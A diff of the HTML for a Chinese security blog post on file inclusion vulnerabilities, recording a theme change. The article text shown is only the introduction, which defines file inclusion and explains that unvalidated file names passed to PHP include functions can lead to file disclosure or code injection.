@@ -1,488 +1,160 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
 
+<!DOCTYPE html><html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="浅析文件包含, hybcx&#39;s blog">
-    <meta name="description" content="文件包含总结
-0x01 文件包含的概念：
-把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。
-1.1 文件包含的原理：
-文件包含漏洞产生的原因是在通过PHP函数引入文件时，由">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  
+  <title>浅析文件包含 - hybcx's blog</title>
 
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  
+    <meta name="description" content="文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 1.2 文件包含分类： 文件包含分为本地文件包含和远程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析文件包含">
+<meta property="og:url" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/index.html">
+<meta property="og:site_name" content="hybcx&#39;s blog">
+<meta property="og:description" content="文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 1.2 文件包含分类： 文件包含分为本地文件包含和远程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321185813902.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321192756427.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321193810165.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321200640758.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321200926394.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321203740146.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321203837999.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230618164128542.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321204222933.png">
+<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321204231560.png">
+<meta property="article:published_time" content="2023-08-07T01:29:55.116Z">
+<meta property="article:modified_time" content="2023-10-22T08:03:55.268Z">
+<meta property="article:author" content="hybcx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hybcx.xyz/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321185813902.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+
+  
     
-      gtag('config', 'G-BYTY196ENH');
-    </script>
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
 
+  
 
-    <title>浅析文件包含 | hybcx&#39;s blog</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    
+  <script>
+  if (window.localStorage.getItem('ZYI_Theme_Mode')==='dark' || (window.localStorage.getItem('ZYI_Theme_Mode')==='Moss' && window.matchMedia('(prefers-color-scheme: dark)').matches)){
+      document.querySelector("html").id = "ZYDark";
+  }
+</script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/custom/css/ZYDark.css">
 
-
-    <!-- bg-cover style     -->
-
-
-
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
-
-
-
-
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
-
-
-
-
-    
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
-
-
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
-<meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
-
-
 <body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
-                </a>
-            </div>
-            
 
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
-<div id="mobile-nav" class="side-nav sidenav">
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/logo.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 奈何却无能</div></a></div></header>
 
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">hybcx&#39;s blog</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
-    </div>
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
 </div>
+<div class="widgets">
 
 
-        </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
-
-</header>
-
-    
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">浅析文件包含</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+<widget class="widget-wrapper slide-up post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/04/15/uuctf-2022/"><span class="title">UUCTF_2022</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a></div></widget>
 </div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
 
 
 
 
-<main class="post-container content">
 
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/">常见top漏洞</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-08-07T01:29:55.116Z">2023-08-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-10-22T08:03:55.268Z">2023-10-22</time></span></div></div></div>
     
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                常见top漏洞
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-08-07
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-10-22
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.5k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    26 分
-                </div>
-                
-
-                
-            </div>
-        </div>
-        <hr class="clearfix">
-
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>浅析文件包含</span></h1>
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.css">
-        
-
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1>文件包含总结</h1>
-<h2 id="0x01-文件包含的概念：">0x01 文件包含的概念：</h2>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h1 id="文件包含总结">文件包含总结</h1>
+<h2 id="0x01-文件包含的概念">0x01 文件包含的概念：</h2>
 <p><strong>把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。</strong></p>
-<h3 id="1-1-文件包含的原理：">1.1 文件包含的原理：</h3>
+<h3 id="11-文件包含的原理">1.1 文件包含的原理：</h3>
 <p><strong>文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</strong></p>
